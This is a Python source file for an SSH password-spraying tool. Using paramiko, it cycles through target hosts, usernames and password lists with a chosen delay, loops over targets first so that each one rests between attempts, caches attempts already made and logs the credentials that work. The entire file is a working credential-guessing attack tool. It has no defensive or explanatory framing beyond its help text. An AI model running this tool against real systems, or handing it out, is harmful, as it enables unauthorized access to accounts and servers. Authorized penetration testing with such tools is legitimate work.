import argparse
import os
import paramiko
import sys
import time
import traceback
import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.listUtils as lu
import ZHOR_Modules.logUtils as logu
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.SPTT as SPTT
import ZHOR_Modules.timestampsUtils as tsu

parser = argparse.ArgumentParser(description="SSH Password Spray")
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Argomenti necessari
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET(s)"',type=str,required=True,help='Target or targets file containing IP or fqdn.')
REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USER(s)"',type=str,required=True,help='Username or usernames list')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORD(s)"',type=str,required=True,help='Password or passwords list')
REQUIRED_ARGUMENTS.add_argument('-d',metavar='"DELAY"',type=int,required=True,help='Delay between each request (in milliseconds)')


# Argomenti opzionali
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ==========================================================================================================================================================

TupleCacher = SPTT.TupleCacher('cache/password-spray-cache.db',columnNames=["target","user","password"],columnTypes=["TEXT","TEXT","BLOB"])
LOG_PATH = f'logs/{tsu.getTimeStamp_iso8601()}.log'

def connect(target:str,user: str, password: str):

    subject = f"{target} {user} {password}"

    if TupleCacher.tupleExists((target,user,password)):
        logu.logDebug(f"[CACHED] {subject}",fileName=LOG_PATH)
        return 1

    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # default
    target_IP = target
    target_Port = 22

    # if port is specified
    if ':' in target:
        values = target.split(':')
        target_IP = values[0]
        target_Port = values[1]
    
    logu.logDebug(f"[DEBUG] testing {subject}")

    try:
        ssh.connect(target_IP,username=user,password=password,port=target_Port)
        ssh.close()
        
        logu.logInfo(f"[SUCCESS] {subject}",fileName=LOG_PATH)
        TupleCacher.insertSuccess((target,user,password))


    # bad auth type - can be considered as failure beecause a password alone won't be enough to login
    except paramiko.BadAuthenticationType as e1:
        log_msg = f'Received bad authentication type exception. Cannot authenticate with just a password. Exception: {e1}'
        logu.logDebug(f"[FAILED] {subject} | {log_msg}")
        TupleCacher.insertFail((target,user,password))

    # auth exception - bad credentials
    except paramiko.AuthenticationException as e2:
        log_msg = f'Received authentication exception. Wrong credentials. Exception: {e2}'
        logu.logDebug(f"[FAILED] {subject} | {log_msg}")
        TupleCacher.insertFail((target,user,password))

    # other type of exception
    except Exception as e:
        logu.logDebug(f"[EXCEPTION] {subject}")
        logu.logException(traceback,e)

    return 0


if __name__ == '__main__':

    targets     = None
    users       = None
    passwords   = None

    if os.path.isfile(args.t):
        targets = fm.fileToSimpleList(args.t)
    else:
        targets = [args.t]

    if os.path.isfile(args.u):
        users = fm.fileToSimpleList(args.u)
    else:
        users = [args.u]

    if os.path.isfile(args.p):
        passwords = fm.fileToSimpleList(args.p)
    else:
        passwords = [args.p]
    
    sleepTime = args.d/1000

    
    # iterate targets first to let them cooldown
    for p in passwords:
        for u in users:
            for t in targets:
                res = connect(t,u,p)
                
                if res == 0:
                    time.sleep(sleepTime)


    TupleCacher.dumpToDB()